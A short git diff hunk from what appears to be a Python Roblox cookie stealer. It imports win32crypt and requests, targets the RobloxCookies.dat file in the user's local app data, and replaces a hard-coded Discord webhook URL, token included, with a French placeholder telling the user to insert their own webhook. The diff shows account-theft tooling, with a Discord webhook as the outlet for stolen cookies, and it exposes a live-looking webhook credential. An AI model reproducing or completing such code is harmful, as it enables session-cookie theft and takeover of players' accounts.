@@ -5,7 +5,7 @@ import win32crypt
 import requests
 import re
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1500889759462195210/OYhdSGwMVAgf3aYwDRNlYWAH8475tRSoTu5NZfy60kJbcrwW7c4vq-natCwzC31zI6IR"
+WEBHOOK_URL = "change par ton webhook"
 
 ROBLOX_COOKIE_PATH = os.path.expandvars(
     r"%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat"
